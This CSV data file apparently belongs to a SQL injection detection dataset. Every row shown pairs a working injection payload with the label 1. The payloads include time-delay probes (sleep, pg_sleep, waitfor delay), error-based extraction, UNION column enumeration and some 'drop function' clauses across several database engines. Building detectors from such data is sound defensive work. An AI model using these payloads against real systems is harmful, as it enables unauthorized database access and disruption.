,Sentence,Label
8376,1 )  where 4600 = 4600 or sleep ( 5 ) --,1
8377,1' )  as ubvf where 5923 = 5923 and 8490 = 4925--,1
8378,"-1763"" )  or elt ( 1032 = 1032,3623 )  and  ( ""nqvv"" = ""nqvv",1
8379, ( select  ( case when  ( 6783 = 6783 )  then 1 else 1/ ( select 0 )  end  )  )  ,1
8380,1 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
8381,1'  )  )   as lkse where 9951 = 9951,1
8382,"1'  )  )   union all select null,null#",1
8383,select  ( case when  ( 8841 = 9675 )  then 8841 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
8384,1%' )  union all select null#,1
8385,"-4419%""  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1
8386,"1""  )  )   as ecnn where 8913 = 8913 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1
8387,"1"" union all select null--",1
8388,"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and ""azzv"" like ""azzv",1
8389,"1' )  union all select null,null,null,null#",1
8390,1' where 9583 = 9583 and 5319 = 7670#,1
8391,1' )  as tvqn where 2967 = 2967,1
8392,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( ""%"" = """,1
8393,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and 'ybjo' = 'ybjo",1
8394,"1'  )  )   )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and   (  (   ( 'vbda' like 'vbda",1
8395,"1 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) # myqr",1
8396,select  ( case when  ( 3217 = 8421 )  then 3217 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
8397,select  ( case when  ( 6435 = 8988 )  then 6435 else 6435* ( select 6435 from information_schema.character_sets )  end ) #,1
8398,"1%""  )  )   )  order by 1--",1
8399,"1"" )  where 7578 = 7578 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8400,1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'izyf' = 'izyf,1
8401,1' )  as hwpf where 5603 = 5603,1
8402,-6843' or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'eeff' = 'eeff,1
8403,1'+ ( select gkve where 1943 = 1943 waitfor delay '0:0:5' ) +',1
8404,"1'|| ( select 'wgte' from dual where 6316 = 6316 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1
8405,"1 where 1326 = 1326 union all select null,null,null,null,null,null--",1
8406,1 where 7299 = 7299 rlike sleep ( 5 ) --,1
8407,"-2889  )  )   as iqzv where 1786 = 1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",1
8408,"1 where 7932 = 7932 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
8409,"1',updatexml ( 2917,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 2917 = 2917,1  )  )   ) ,0x717a767a71 ) ,8295 ) ",1
8410,1 where 7802 = 7802,1
8411,1'+ ( select 'ohdf' where 7878 = 7878 and 5678 = 3277--,1
8412,1' )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 'svwr' = 'svwr,1
8413,"1""  )  )   )  or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (   ( ""hiwo"" like ""hiwo",1
8414,1'+ ( select iowv where 6105 = 6105 and sleep ( 5 ) #,1
8415,"1 where 6369 = 6369 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1
8416,1 )  rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) ,1
8417,"1"" )  as pgza where 8756 = 8756 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8418,-9331' or  ( 4519 = 2912 ) *2912 and 'rddk' = 'rddk,1
8419,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and 'sloy' = 'sloy",1
8420,"-3177'  )  )   union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",1
8421,"-3130'  )  )   )  union all select 2886,2886,2886,2886,2886,2886,2886#",1
8422,"1' )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and  ( 'sstt' = 'sstt",1
8423,if ( 4135 = 2165 )  select 4135 else drop function otyy--,1
8424,"1%""  )  )   and 6283 = 2068 and   (  (  ""%"" = """,1
8425, end and   (  (   ( 'hwrs' like 'hwrs,1
8426,1 )  as vxsh where 4706 = 4706,1
8427,-8652' )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ,1
8428,"1'|| ( select 'ojdz' where 7350 = 7350 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  ||'",1
8429,"1'|| ( select 'kfyh' where 4737 = 4737 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  ||'",1
8430, ( select 2527 from pg_sleep ( 5  )  )  ,1
8431,"1""  )  )   as wwqj where 3249 = 3249 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8432,"1  )  )   as acni where 6355 = 6355 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
8433,"-2766%'  )  )   union all select 4458,4458,4458,4458,4458--",1
8434,waitfor delay '0:0:5' and   (  (  'yjsp' like 'yjsp,1
8435,"1'|| ( select 'nzjz' where 3539 = 3539 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
8436,"-6360' )  as yfrk where 3683 = 3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",1
8437,"1' in boolean mode )  union all select null,null,null,null--",1
8438,"select * from generate_series ( 7494,7494,case when  ( 7494 = 7854 )  then 1 else 0 end )  limit 1--",1
8439,"1' )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
8440,"1"" )  where 7513 = 7513 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
8441,"-1600%""  )  )   )  or elt ( 4568 = 7693,7693 )  and   (  (   ( ""%"" = """,1
8442,if ( 2695 = 9045 )  select 2695 else drop function qmno--,1
8443,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( 7946 = 7946",1
8444,"1 )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( 5621 = 5621",1
8445,"1 )  where 5309 = 5309 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8446,"1"" where 4213 = 4213 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
8447,"-1859' union all select 1781,1781,1781,1781#",1
8448,1' )  where 5214 = 5214,1
8449,"select count ( * )  from generate_series ( 1,5000000 )  and   (  (   ( '%' = '",1
8450,"1%'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( '%' = '",1
8451,-6081 where 3681 = 3681 or 2603 = 3138--,1
8452,-1190' or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and 'yxry' like 'yxry,1
8453,select  ( case when  ( 5203 = 6330 )  then 5203 else 5203* ( select 5203 from mysql.db )  end ) #,1
8454,1'|| ( select 'lmsc' from dual where 1162 = 1162 order by 1--,1
8455,"select count ( * )  from generate_series ( 1,5000000 )  and   (  (  ""bhmu"" like ""bhmu",1
8456,"-6357"" )  order by 1--",1
8457,"1""  )  )   and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  ""zptu"" = ""zptu",1
8458,"1 and make_set ( 9681 = 4703,4703 ) # zbrf",1
8459,"1' )  as sjzi where 8242 = 8242 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8460,1'+ ( select rhlb where 9477 = 9477,1
8461,"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  ""%"" = """,1
8462,"-2216"" )  where 6692 = 6692 union all select 6692,6692,6692#",1
8463,-6397%' or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and '%' = ',1
8464,"1' )  as afnt where 4719 = 4719 and elt ( 8224 = 1275,1275 ) --",1
8465,1'  )  )   as rxxd where 5049 = 5049,1
8466,"1'+ ( select sxco where 1623 = 1623 union all select null,null--",1
8467,"1"" where 4978 = 4978 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
8468,1' where 3188 = 3188 and 9198 = 9198--,1
8469,"1'+ ( select 'eoxk' where 6621 = 6621 union all select null,null#",1
8470,1 )  as qywz where 1864 = 1864 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --,1
8471,"1""  )  )   union all select null,null--",1
8472,"1 where 2988 = 2988 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
8473,"1' )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and  ( 'mseo' like 'mseo",1
8474,"1""  )  )   or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (  ""vlev"" like ""vlev",1
8475,1'+ ( select 'rkap' where 9692 = 9692,1
8476,"1%'  )  )   and elt ( 4249 = 4249,7259 )  and   (  (  '%' = '",1
8477,"1""  )  )   as qejm where 9014 = 9014 union all select null,null,null,null,null,null#",1
8478,-9556' )  where 2472 = 2472 or  ( 2883 = 9968 ) *9968--,1
8479,1 )  as nxmd where 8650 = 8650,1
8480,-8812 or 6872 = 6872# dflr,1
8481,1%' and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and '%' = ',1
8482,"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'iaud' = 'iaud",1
8483,1 and  ( 3020 = 3020 ) *6703-- zsnl,1
8484,1  )  )   as rhwg where 8843 = 8843,1
8485,-2495  )  )   as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
8486,"-9697 )  union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1
8487,"-4068'  )  )   )  union all select 9491,9491,9491--",1
8488,"1%""  )  )   )  or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
8489,"elt ( 5098 = 2728,1 ) ",1
8490,1' where 7882 = 7882 and 6663 = 4524--,1
8491,"1%""  )  )   )  union all select null,null,null--",1
8492,"1""  )  )   as bosq where 4695 = 4695",1
8493,"-6463""  )  )   )  union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
8494,"1'  )  )   as nlfq where 3410 = 3410 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
8495,"1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'ylql' like 'ylql",1
8496,if ( 3593 = 3779 )  select 3593 else drop function qtqy--,1
8497,"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  (  8535 = 8535",1
8498,if ( 8995 = 9787 )  select 8995 else drop function ofgg--,1
8499,"1"" )  rlike sleep ( 5 )  and  ( ""efoq"" like ""efoq",1
8500,"1'  )  )   and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'pydi' like 'pydi",1
8501,"1'+ ( select sshu where 3442 = 3442 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  +'",1
8502,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'inec' = 'inec",1
8503, ( select * from  ( select ( sleep ( 5  )  )   ) srmq )  and   (  (  '%' = ',1
8504,"1"" )  as jscj where 2308 = 2308 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8505,"1%'  )  )   and make_set ( 6527 = 9529,9529 )  and   (  (  '%' = '",1
8506,"1 where 5401 = 5401 and elt ( 1210 = 1210,sleep ( 5  )  )  --",1
8507,"1%' )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( '%' = '",1
8508,"1%""  )  )   or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and   (  (  ""%"" = """,1
8509,"1""  )  )   and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (  ""vdyr"" = ""vdyr",1
8510,1' )  and 4380 = 5851 and  ( 'cxcl' = 'cxcl,1
8511,-6757'  )  )   )  or 4524 = 3696,1
8512,"1 )  where 4810 = 4810 union all select null,null#",1
8513,-6586'  )  )   or 2021 = 2996,1
8514,"-4100'  )  )   union all select 1163,1163,1163--",1
8515,"-2216  )  )   as hxmq where 5677 = 5677 union all select 5677,5677--",1
8516,"1%"" )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( ""%"" = """,1
8517,"1' )  where 7887 = 7887 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
8518,"-6942' )  union all select 7280,7280,7280#",1
8519,"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) +'",1
8520,"-6000"" )  where 1797 = 1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",1
8521,"1  )  )   )  or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
8522,"-7876%' )  union all select 3909,3909,3909,3909,3909#",1
8523,"1' union all select null,null,null,null,null,null#",1
8524,"1 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1
8525,"1 )  as xuvz where 3061 = 3061 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8526,"-9583%""  )  )   union all select 9349,9349,9349,9349,9349,9349,9349--",1
8527,"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1
8528,"1 )  where 5048 = 5048 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
8529,"-4944%""  )  )   or make_set ( 1084 = 1988,1988 )  and   (  (  ""%"" = """,1
8530,"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1
8531,"-8707' )  union all select 5609,5609,5609--",1
8532,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1
8533,"1""  )  )   )  union all select null,null,null,null,null,null#",1
8534,"select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh' = 'xemh",1
8535,if ( 9690 = 6491 )  select 9690 else drop function nyln--,1
8536,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 'xcnj' = 'xcnj",1
8537,"-1051"" )  where 6586 = 6586 or 6647 = 6738#",1
8538,1'+ ( select zmbu where 8685 = 8685 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   ) +',1
8539,"1 where 5627 = 5627 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
8540,1 where 4949 = 4949,1
8541,"1 )  where 7881 = 7881 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
8542,1'  )  )   waitfor delay '0:0:5' and   (  (  'amnf' like 'amnf,1
8543,"1 )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  ",1
8544,"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1
8545,"select count ( * )  from generate_series ( 1,5000000 )  and 'fahy' like 'fahy",1
8546,"1""  )  )   as dcrk where 5164 = 5164 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
8547,-8745' )  as xpwv where 8855 = 8855 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --,1
8548,"1  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( 4858 = 4858",1
8549,1 )  where 1203 = 1203 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1
8550,"-2418'|| ( select 'mdbt' from dual where 3026 = 3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1
8551,1 where 3357 = 3357 and  ( 9492 = 4334 ) *4334--,1
8552,"1%'  )  )   union all select null,null,null#",1
8553,"1%""  )  )   or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""%"" = """,1
8554,"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( ""%"" = """,1
8555,"1""  )  )   as tncm where 8203 = 8203 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
8556,"1'  )  )   )  and make_set ( 6094 = 2929,2929 )  and   (  (   ( 'gkyo' = 'gkyo",1
8557,1'|| ( select 'feyg' from dual where 7734 = 7734 and 3843 = 6724#,1
8558,"1""  )  )   )  and 7533 = 7533 and   (  (   ( ""xopd"" = ""xopd",1
8559,"1%"" )  and elt ( 7436 = 9874,9874 )  and  ( ""%"" = """,1
8560,-2866'  )  )   or 4491 = 9429#,1
8561,"1' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1
8562, end and   (  (  'pfrt' = 'pfrt,1
8563,1 )  as ozga where 4002 = 4002 and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  --,1
8564,"iif ( 7011 = 2522,1,1/0 ) ",1
8565,-4904' )  as ogyu where 2821 = 2821 or 5982 = 1643,1
8566,-3339' or 8571 = 8571--,1
8567,"1%'  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  '%' = '",1
8568,"1"" or elt ( 6272 = 6272,sleep ( 5  )  )   and ""hvic"" like ""hvic",1
8569,1' and  ( 3020 = 3020 ) *6703 and 'hnvf' = 'hnvf,1
8570,"1' where 3125 = 3125  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1
8571,"-6108' )  union all select 2519,2519,2519,2519--",1
8572,"1""  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
8573,"1"" )  where 2839 = 2839 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
8574,"-6848""  )  )   or 4071 = 5312",1
8575,"1"" )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
8576,"1%'  )  )   )  union all select null,null,null,null,null,null,null,null,null--",1
8577, ( select * from  ( select ( sleep ( 5  )  )   ) srmq ) #,1
8578,1'+ ( select 'stsu' where 2386 = 2386 or sleep ( 5 ) #,1
8579,"1 )  where 9149 = 9149 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1
8580,-5470'  )  )   or  ( 8459 = 8459 ) *4906 and   (  (  'oeam' = 'oeam,1
8581,1'|| ( select 'hlxd' from dual where 2615 = 2615 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ||',1
8582,-4583' )  as evbo where 6055 = 6055 union all select 6055--,1
8583,"1%'  )  )   )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and   (  (   ( '%' = '",1
8584,1'|| ( select 'kptj' from dual where 5123 = 5123,1
8585,"-3126  )  )   union all select 6718,6718,6718,6718,6718--",1
8586,"-7448 union all select 4072,4072#",1
8587,"1""  )  )   and 9800 = 8713",1
8588,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'fvda' like 'fvda",1
8589,"1' in boolean mode )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",1
